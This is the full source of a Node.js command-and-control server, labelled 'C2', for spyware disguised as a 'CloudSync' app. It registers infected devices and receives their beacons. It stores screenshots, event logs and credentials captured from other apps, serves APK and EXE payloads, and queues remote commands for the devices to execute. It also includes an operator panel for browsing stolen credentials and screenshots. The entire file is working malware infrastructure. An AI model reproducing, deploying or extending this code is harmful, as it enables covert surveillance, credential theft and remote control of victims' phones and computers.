/* CLOUDSYNC SERVICE - C2 (Fase 1)
   Node.js 24 + Express 4 + SQLite (node:sqlite, fallback better-sqlite3) */
'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const express = require('express');
const compression = require('compression');
const cookieParser = require('cookie-parser');

const ROOT = __dirname;
const SHARED_DIR = process.env.SHARED_DIR || path.join(ROOT, '..', 'shared');

const CFG = {
  port:       Number(process.env.PORT || 3000),
  dataDir:    process.env.DATA_DIR  || path.join(ROOT, 'data'),
  filesDir:   process.env.FILES_DIR || path.join(ROOT, 'files'),
  publicDir:  path.join(ROOT, 'public'),
  panelPath:  normalizePath(process.env.PANEL_PATH || '/console'),
  panelPass:  process.env.PANEL_PASSWORD || 'changeme',
  totpSecret: (process.env.PANEL_TOTP_SECRET || '').replace(/\s+/g, ''),
  sessionKey: process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex'),
  publicUrl:  (process.env.PUBLIC_URL || '').replace(/\/+$/, ''),
  apkUrl:     process.env.APK_URL || '',
  exeUrl:     process.env.EXE_URL || '',
  appName:    process.env.APP_NAME || 'CloudSync',
  version:    '2.1.4',
  pollMs:     Number(process.env.POLL_MS || 2500),
  shotMs:     Number(process.env.SHOT_MS || 2500),
  locMs:      Number(process.env.LOC_MS  || 300000),
  batchMs:    Number(process.env.BATCH_MS || 10000),
  maxShotsPerDevice:  Number(process.env.MAX_SHOTS  || 400),
  maxEventsPerDevice: Number(process.env.MAX_EVENTS || 20000)
};

function normalizePath(p) {
  let s = String(p || '').trim();
  if (!s.startsWith('/')) s = '/' + s;
  s = s.replace(/\/+$/, '');
  return s === '' ? '/console' : s;
}

let PROTO_VER = '0';
try {
  const pf = path.join(SHARED_DIR, 'protocol.json');
  if (fs.existsSync(pf)) PROTO_VER = String(JSON.parse(fs.readFileSync(pf, 'utf8')).version || '0');
} catch (e) { console.warn('[!] no pude leer shared/protocol.json'); }

fs.mkdirSync(CFG.dataDir,   { recursive: true });
fs.mkdirSync(CFG.filesDir,  { recursive: true });
fs.mkdirSync(CFG.publicDir, { recursive: true });

const DB_FILE = path.join(CFG.dataDir, 'service.db');

function openDatabase(file) {
  try {
    const { DatabaseSync } = require('node:sqlite');
    const d = new DatabaseSync(file);
    d.__driver = 'node:sqlite';
    return d;
  } catch (e1) {
    try {
      const Better = require('better-sqlite3');
      const d = new Better(file);
      d.__driver = 'better-sqlite3';
      return d;
    } catch (e2) {
      console.error('[FATAL] Sin motor SQLite. ' + e1.message + ' | ' + e2.message);
      process.exit(1);
    }
  }
}

const db = openDatabase(DB_FILE);

db.exec(`
  PRAGMA journal_mode = WAL;
  PRAGMA synchronous  = NORMAL;

  CREATE TABLE IF NOT EXISTS devices (
    id TEXT PRIMARY KEY, token TEXT NOT NULL, label TEXT, platform TEXT, model TEXT,
    os_ver TEXT, app_ver TEXT, sdk TEXT, tags TEXT, first_seen INTEGER NOT NULL,
    last_seen INTEGER NOT NULL, last_ip TEXT, last_ua TEXT, battery INTEGER,
    charging INTEGER, net TEXT, screen_on INTEGER, sim TEXT, locale TEXT, notes TEXT,
    proto_ver TEXT
  );
  CREATE TABLE IF NOT EXISTS events (
    id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT NOT NULL,
    ts INTEGER NOT NULL, type TEXT NOT NULL, data TEXT
  );
  CREATE INDEX IF NOT EXISTS idx_events_dev  ON events(device_id, id DESC);
  CREATE INDEX IF NOT EXISTS idx_events_type ON events(device_id, type, id DESC);
  CREATE TABLE IF NOT EXISTS shots (
    id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT NOT NULL, ts INTEGER NOT NULL,
    hash TEXT, w INTEGER, h INTEGER, mime TEXT, screen TEXT, data TEXT NOT NULL
  );
  CREATE INDEX IF NOT EXISTS idx_shots_dev ON shots(device_id, id DESC);
  CREATE TABLE IF NOT EXISTS creds (
    id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT NOT NULL, ts INTEGER NOT NULL,
    pkg TEXT, kind TEXT, username TEXT, secret TEXT, extra TEXT
  );
  CREATE INDEX IF NOT EXISTS idx_creds_dev ON creds(device_id, id DESC);
  CREATE TABLE IF NOT EXISTS commands (
    id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT NOT NULL, cmd TEXT NOT NULL,
    args TEXT, status TEXT NOT NULL DEFAULT 'queued', created_at INTEGER NOT NULL,
    sent_at INTEGER, done_at INTEGER, result TEXT
  );
  CREATE INDEX IF NOT EXISTS idx_cmd_dev ON commands(device_id, status, id);
  CREATE TABLE IF NOT EXISTS kv (k TEXT PRIMARY KEY, v TEXT);
`);

try { db.exec('ALTER TABLE devices ADD COLUMN proto_ver TEXT'); } catch {}

const q   = (sql, ...a) => db.prepare(sql).run(...a);
const one = (sql, ...a) => db.prepare(sql).get(...a);
const all = (sql, ...a) => db.prepare(sql).all(...a);
const now = () => Date.now();
const uid = (n = 12) => crypto.randomBytes(n).toString('hex');
const j   = (o) => JSON.stringify(o === undefined ? null : o);
const pj  = (s, d = null) => { try { return s ? JSON.parse(s) : d; } catch { return d; } };

function safeEqual(a, b) {
  const ba = Buffer.from(String(a)), bb = Buffer.from(String(b));
  if (ba.length !== bb.length) return false;
  return crypto.timingSafeEqual(ba, bb);
}

const B32 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';

function base32Decode(s) {
  const clean = String(s).replace(/=+$/, '').replace(/\s+/g, '').toUpperCase();
  let bits = 0, val = 0, idx = 0;
  const out = Buffer.alloc(Math.floor((clean.length * 5) / 8) + 1);
  for (const ch of clean) {
    const i = B32.indexOf(ch);
    if (i < 0) continue;
    val = (val << 5) | i; bits += 5;
    if (bits >= 8) { out[idx++] = (val >>> (bits - 8)) & 0xff; bits -= 8; }
  }
  return out.subarray(0, idx);
}

function totpCode(secret, t = Date.now()) {
  const key = base32Decode(secret);
  const counter = Math.floor(t / 1000 / 30);
  const buf = Buffer.alloc(8);
  buf.writeUInt32BE(Math.floor(counter / 4294967296), 0);
  buf.writeUInt32BE(counter >>> 0, 4);
  const hmac = crypto.createHmac('sha1', key).update(buf).digest();
  const off = hmac[19] & 0x0f;
  const code = (((hmac[off] & 0x7f) << 24) | (hmac[off + 1] << 16) |
                (hmac[off + 2] << 8) | hmac[off + 3]) % 1000000;
  return String(code).padStart(6, '0');
}

function totpVerify(secret, code) {
  if (!secret) return true;
  const c = String(code || '').trim();
  for (let d = -1; d <= 1; d++) {
    if (totpCode(secret, Date.now() + d * 30000) === c) return true;
  }
  return false;
}

function signSession(payload) {
  return payload + '.' + crypto.createHmac('sha256', CFG.sessionKey).update(payload).digest('hex');
}
function readSession(raw) {
  if (!raw) return null;
  const i = raw.lastIndexOf('.');
  if (i < 0) return null;
  const payload = raw.slice(0, i), mac = raw.slice(i + 1);
  const expect = crypto.createHmac('sha256', CFG.sessionKey).update(payload).digest('hex');
  if (!safeEqual(mac, expect)) return null;
  const [exp, user] = payload.split('|');
  if (!exp || Number(exp) < now()) return null;
  return { user: user || 'operator', exp: Number(exp) };
}

function requirePanel(req, res, next) {
  const s = readSession(req.cookies && req.cookies['cs_sess']);
  if (!s) return res.status(401).json({ ok: false, error: 'no_session' });
  req.operator = s.user;
  next();
}

function requireDevice(req, res, next) {
  const id  = req.get('X-Sync-Id');
  const key = req.get('X-Sync-Key');
  if (!id || !key) return res.status(401).json({ ok: false, error: 'missing_credentials' });
  const d = one('SELECT * FROM devices WHERE id = ?', id);
  if (!d || !safeEqual(d.token, key)) {
    return res.status(401).json({ ok: false, error: 'unknown_device' });
  }
  req.device = d;
  next();
}

const app = express();
app.disable('x-powered-by');
app.set('trust proxy', true);
app.use(compression({ threshold: 512 }));
app.use(cookieParser());
app.use(express.json({ limit: '12mb' }));
app.use(express.urlencoded({ extended: false, limit: '12mb' }));

app.use((req, res, next) => {
  res.set('X-Service', CFG.appName);
  res.set('X-Service-Version', CFG.version);
  res.set('Cache-Control', 'no-store');
  next();
});

function deviceIP(req) {
  const xf = req.get('X-Forwarded-For');
  return xf ? xf.split(',')[0].trim() : (req.ip || '');
}
function numOrNull(v) { const n = Number(v); return Number.isFinite(n) ? n : null; }

function cfgPublica() {
  return {
    service: CFG.appName,
    version: CFG.version,
    protocol: PROTO_VER,
    poll_ms: CFG.pollMs,
    shot_ms: CFG.shotMs,
    loc_ms: CFG.locMs,
    batch_ms: CFG.batchMs,
    endpoints: {
      register: '/api/v1/sync/register',
      beacon:   '/api/v1/sync/beacon',
      push:     '/api/v1/sync/push',
      result:   '/api/v1/sync/result',
      protocol: '/assets/protocol.json'
    },
    assets: {
      apk: CFG.apkUrl || (CFG.publicUrl + '/download/app.apk'),
      exe: CFG.exeUrl || (CFG.publicUrl + '/download/app.exe')
    },
    flags: pj((one('SELECT v FROM kv WHERE k = ?', 'flags') || {}).v, {}) || {}
  };
}

app.post('/api/v1/sync/register', (req, res) => {
  const b = req.body || {};
  const t = now();

  if (b.device_id && b.token) {
    const ex = one('SELECT * FROM devices WHERE id = ?', b.device_id);
    if (ex && safeEqual(ex.token, b.token)) {
      q(`UPDATE devices SET last_seen=?, last_ip=?, last_ua=?, model=?, os_ver=?,
           app_ver=?, platform=?, sdk=?, locale=?, proto_ver=?, label=COALESCE(?, label)
         WHERE id=?`,
        t, deviceIP(req), req.get('user-agent') || '', b.model || ex.model,
        b.os_ver || ex.os_ver, b.app_ver || ex.app_ver, b.platform || ex.platform,
        b.sdk || ex.sdk, b.locale || ex.locale, b.protocol || null,
        b.label || null, b.device_id);
      return res.json({ ok: true, device_id: b.device_id, token: b.token, known: true,
                        server_time: t, config: cfgPublica(),
                        protocol_update: String(b.protocol || '') !== PROTO_VER });
    }
  }

  const id = 'dv_' + uid(8), token = uid(24);
  q(`INSERT INTO devices (id, token, label, platform, model, os_ver, app_ver, sdk,
        locale, proto_ver, first_seen, last_seen, last_ip, last_ua)
     VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
    id, token, b.label || null, b.platform || null, b.model || null, b.os_ver || null,
    b.app_ver || null, b.sdk || null, b.locale || null, b.protocol || null,
    t, t, deviceIP(req), req.get('user-agent') || '');

  q('INSERT INTO events (device_id, ts, type, data) VALUES (?,?,?,?)',
    id, t, 'hello', j({ model: b.model, os: b.os_ver, ip: deviceIP(req), proto: b.protocol }));

  console.log('[+] nuevo dispositivo ' + id + ' (' + (b.model || '?') + ')');
  res.json({ ok: true, device_id: id, token, known: false, server_time: t,
             config: cfgPublica(), protocol_update: true });
});

app.post('/api/v1/sync/beacon', requireDevice, (req, res) => {
  const b = req.body || {}, t = now();
  q(`UPDATE devices SET last_seen=?, last_ip=?, last_ua=?, battery=?, charging=?,
       net=?, screen_on=?, sim=COALESCE(?, sim) WHERE id=?`,
    t, deviceIP(req), req.get('user-agent') || '', numOrNull(b.battery),
    b.charging ? 1 : 0, b.net || null, b.screen_on ? 1 : 0, b.sim || null, req.device.id);

  const pend = all(`SELECT id, cmd, args FROM commands
                    WHERE device_id = ? AND status = 'queued' ORDER BY id LIMIT 25`,
                   req.device.id);
  if (pend.length) {
    const upd = db.prepare(`UPDATE commands SET status='sent', sent_at=? WHERE id=?`);
    for (const c of pend) upd.run(t, c.id);
  }
  res.json({ ok: true, server_time: t,
             commands: pend.map(c => ({ id: c.id, cmd: c.cmd, args: pj(c.args, {}) })),
             config: cfgPublica() });
});

app.post('/api/v1/sync/push', requireDevice, (req, res) => {
  const b = req.body || {}, dev = req.device.id;
  let nEvents = 0, nShots = 0, nCreds = 0;

  const insEvent = db.prepare('INSERT INTO events (device_id, ts, type, data) VALUES (?,?,?,?)');
  for (const e of (b.events || []).slice(0, 400)) {
    insEvent.run(dev, e.ts || now(), String(e.type || 'log').slice(0, 32), j(e.data));
    nEvents++;
  }
  const insShot = db.prepare(`INSERT INTO shots (device_id, ts, hash, w, h, mime, screen, data)
                              VALUES (?,?,?,?,?,?,?,?)`);
  for (const s of (b.shots || []).slice(0, 12)) {
    if (!s.data) continue;
    insShot.run(dev, s.ts || now(), s.hash || null, s.w || null, s.h || null,
                s.mime || 'image/jpeg', s.screen || 'main', s.data);
    nShots++;
  }
  const insCred = db.prepare(`INSERT INTO creds (device_id, ts, pkg, kind, username, secret, extra)
                              VALUES (?,?,?,?,?,?,?)`);
  for (const c of (b.creds || []).slice(0, 200)) {
    insCred.run(dev, c.ts || now(), c.pkg || null, c.kind || null,
                c.username || null, c.secret || null, j(c.extra));
    nCreds++;
  }
  if (b.events || b.shots || b.creds) q('UPDATE devices SET last_seen=? WHERE id=?', now(), dev);

  if (nShots) q(`DELETE FROM shots WHERE device_id = ? AND id NOT IN
                 (SELECT id FROM shots WHERE device_id = ? ORDER BY id DESC LIMIT ?)`,
                dev, dev, CFG.maxShotsPerDevice);
  if (nEvents) q(`DELETE FROM events WHERE device_id = ? AND id NOT IN
                  (SELECT id FROM events WHERE device_id = ? ORDER BY id DESC LIMIT ?)`,
                 dev, dev, CFG.maxEventsPerDevice);

  res.json({ ok: true, stored: { events: nEvents, shots: nShots, creds: nCreds }, server_time: now() });
});

app.post('/api/v1/sync/result', requireDevice, (req, res) => {
  const b = req.body || {};
  if (!b.id) return res.json({ ok: false, error: 'no_id' });
  q(`UPDATE commands SET status=?, done_at=?, result=? WHERE id=? AND device_id=?`,
    b.ok === false ? 'error' : 'done', now(), String(b.result || '').slice(0, 200000),
    b.id, req.device.id);
  res.json({ ok: true });
});

app.get('/api/v1/health', (req, res) => {
  res.json({ ok: true, service: CFG.appName, version: CFG.version, protocol: PROTO_VER,
             devices: one('SELECT COUNT(*) c FROM devices').c,
             online: one('SELECT COUNT(*) c FROM devices WHERE last_seen > ?', now() - 60000).c,
             db: db.__driver, uptime: Math.round(process.uptime()) });
});

app.get('/assets/protocol.json', (req, res) => {
  const f = path.join(SHARED_DIR, 'protocol.json');
  if (!fs.existsSync(f)) return res.status(404).json({ ok: false, error: 'no_protocol' });
  res.sendFile(f);
});

app.get('/assets/config.json', (req, res) => res.json(cfgPublica()));
app.get('/config.json',        (req, res) => res.json(cfgPublica()));
app.use('/download', express.static(CFG.filesDir, { maxAge: '5m' }));

const panel = express.Router();

panel.post('/api/login', (req, res) => {
  const b = req.body || {};
  if (!safeEqual(b.password || '', CFG.panelPass)) {
    return res.status(401).json({ ok: false, error: 'bad_password', totp: !!CFG.totpSecret });
  }
  if (!totpVerify(CFG.totpSecret, b.totp)) {
    return res.status(401).json({ ok: false, error: 'bad_totp', totp: true });
  }
  const exp = now() + 12 * 3600 * 1000;
  res.cookie('cs_sess', signSession(exp + '|operator'), {
    httpOnly: true, sameSite: 'lax', secure: !!CFG.publicUrl, maxAge: 12 * 3600 * 1000
  });
  res.json({ ok: true });
});

panel.post('/api/logout', (req, res) => { res.clearCookie('cs_sess'); res.json({ ok: true }); });

panel.get('/api/me', requirePanel, (req, res) => {
  res.json({ ok: true, operator: req.operator, service: CFG.appName, version: CFG.version,
             protocol: PROTO_VER, totp: !!CFG.totpSecret, db: db.__driver });
});

panel.get('/api/devices', requirePanel, (req, res) => {
  const t = now();
  const rows = all(`SELECT id, label, platform, model, os_ver, app_ver, battery, charging,
                           net, screen_on, sim, locale, last_ip, proto_ver, first_seen, last_seen
                    FROM devices ORDER BY last_seen DESC`);
  res.json({ ok: true, devices: rows.map(d => ({
    ...d, online: (t - d.last_seen) < 45000, idle: Math.round((t - d.last_seen) / 1000)
  })) });
});

panel.get('/api/device', requirePanel, (req, res) => {
  const id = req.query.id;
  const d = one('SELECT * FROM devices WHERE id=?', id);
  if (!d) return res.status(404).json({ ok: false });
  const t = now();
  res.json({ ok: true,
    device: { ...d, online: (t - d.last_seen) < 45000, idle: Math.round((t - d.last_seen) / 1000) },
    counts: {
      events: one('SELECT COUNT(*) c FROM events WHERE device_id=?', id).c,
      shots:  one('SELECT COUNT(*) c FROM shots  WHERE device_id=?', id).c,
      creds:  one('SELECT COUNT(*) c FROM creds  WHERE device_id=?', id).c
    } });
});

panel.post('/api/device', requirePanel, (req, res) => {
  const b = req.body || {};
  if (!b.id) return res.json({ ok: false });
  q('UPDATE devices SET label=?, tags=?, notes=? WHERE id=?',
    b.label || null, b.tags || null, b.notes || null, b.id);
  res.json({ ok: true });
});

panel.post('/api/device/delete', requirePanel, (req, res) => {
  const id = (req.body || {}).id;
  for (const t of ['events', 'shots', 'creds', 'commands']) q('DELETE FROM ' + t + ' WHERE device_id=?', id);
  q('DELETE FROM devices WHERE id=?', id);
  res.json({ ok: true });
});

panel.get('/api/events', requirePanel, (req, res) => {
  const { device, type, since } = req.query;
  const limit = Math.min(Number(req.query.limit || 300), 1000);
  let sql = 'SELECT id, ts, type, data FROM events WHERE device_id=?';
  const args = [device];
  if (type)  { sql += ' AND type=?'; args.push(type); }
  if (since) { sql += ' AND id > ?'; args.push(Number(since)); }
  sql += ' ORDER BY id DESC LIMIT ' + limit;
  const rows = all(sql, ...args).map(r => ({ ...r, data: pj(r.data) }));
  if (device) q('INSERT OR REPLACE INTO kv (k,v) VALUES (?,?)', 'read_' + device,
                String(rows.length ? rows[0].id : 0));
  res.json({ ok: true, events: rows });
});

panel.get('/api/creds', requirePanel, (req, res) => {
  const limit = Math.min(Number(req.query.limit || 300), 1000);
  const rows = all('SELECT * FROM creds WHERE device_id=? ORDER BY id DESC LIMIT ' + limit,
                   req.query.device).map(r => ({ ...r, extra: pj(r.extra) }));
  res.json({ ok: true, creds: rows });
});

panel.get('/api/shots', requirePanel, (req, res) => {
  const limit = Math.min(Number(req.query.limit || 60), 300);
  res.json({ ok: true, shots: all(`SELECT id, ts, w, h, mime, hash, screen FROM shots
                                   WHERE device_id=? ORDER BY id DESC LIMIT ` + limit,
                                  req.query.device) });
});

panel.get('/shot/:id', requirePanel, (req, res) => {
  const s = one('SELECT mime, data FROM shots WHERE id=?', req.params.id);
  if (!s) return res.status(404).end();
  res.set('Content-Type', s.mime || 'image/jpeg');
  res.set('Cache-Control', 'private, max-age=120');
  res.end(Buffer.from(s.data, 'base64'));
});

panel.get('/api/commands', requirePanel, (req, res) => {
  const rows = all(`SELECT id, device_id, cmd, args, status, created_at, sent_at, done_at,
                           substr(result,1,4000) result FROM commands
                    WHERE device_id=? ORDER BY id DESC LIMIT 100`, req.query.device);
  res.json({ ok: true, commands: rows.map(r => ({ ...r, args: pj(r.args) })) });
});

panel.post('/api/command', requirePanel, (req, res) => {
  const b = req.body || {};
  if (!b.device_id || !b.cmd) return res.json({ ok: false, error: 'falta device_id o cmd' });
  const r = q('INSERT INTO commands (device_id, cmd, args, status, created_at) VALUES (?,?,?,?,?)',
              b.device_id, String(b.cmd), j(b.args || {}), 'queued', now());
  res.json({ ok: true, id: r.lastInsertRowid });
});

panel.get('/api/config', requirePanel, (req, res) => {
  res.json({ ok: true, config: cfgPublica(),
             flags: pj((one('SELECT v FROM kv WHERE k=?', 'flags') || {}).v, {}) || {},
             panel_path: CFG.panelPath, db: db.__driver,
             counts: { devices: one('SELECT COUNT(*) c FROM devices').c,
                       events:  one('SELECT COUNT(*) c FROM events').c,
                       shots:   one('SELECT COUNT(*) c FROM shots').c,
                       creds:   one('SELECT COUNT(*) c FROM creds').c } });
});

panel.post('/api/config', requirePanel, (req, res) => {
  const b = req.body || {};
  if (b.flags !== undefined) q('INSERT OR REPLACE INTO kv (k,v) VALUES (?,?)', 'flags', j(b.flags));
  if (b.poll_ms) CFG.pollMs = Number(b.poll_ms);
  if (b.shot_ms) CFG.shotMs = Number(b.shot_ms);
  if (b.loc_ms)  CFG.locMs  = Number(b.loc_ms);
  res.json({ ok: true, config: cfgPublica() });
});

panel.get('/api/backup', requirePanel, (req, res) => {
  res.set('Content-Disposition', 'attachment; filename="backup.json"');
  res.json({ version: CFG.version, taken_at: now(),
             devices: all('SELECT * FROM devices'),
             commands: all("SELECT * FROM commands WHERE status='queued'"),
             kv: all('SELECT * FROM kv') });
});

panel.get(['/', ''], (req, res) => res.sendFile(path.join(CFG.publicDir, 'panel.html')));

app.use(CFG.panelPath, panel);
app.get(CFG.panelPath, (req, res) => res.redirect(CFG.panelPath + '/'));

app.use(express.static(CFG.publicDir, { index: 'index.html', maxAge: '1h' }));
app.get('/version', (req, res) => res.type('text').send(CFG.version));
app.use((req, res) => res.status(404).json({ ok: false, error: 'not_found' }));

const server = app.listen(CFG.port, '0.0.0.0', () => {
  console.log('  ' + CFG.appName + ' service v' + CFG.version + ' (protocolo ' + PROTO_VER + ')');
  console.log('  Puerto: ' + CFG.port + ' | SQLite: ' + db.__driver + ' | Panel: ' + CFG.panelPath + '/');
  console.log('  2FA: ' + (CFG.totpSecret ? 'ACTIVADO' : 'desactivado'));
});

for (const sig of ['SIGTERM', 'SIGINT']) {
  process.on(sig, () => {
    server.close(() => { try { db.close(); } catch {} process.exit(0); });
    setTimeout(() => process.exit(0), 4000);
  });
}
process.on('uncaughtException',  e => console.error('[!] uncaught:', e));
process.on('unhandledRejection', e => console.error('[!] rejection:', e));
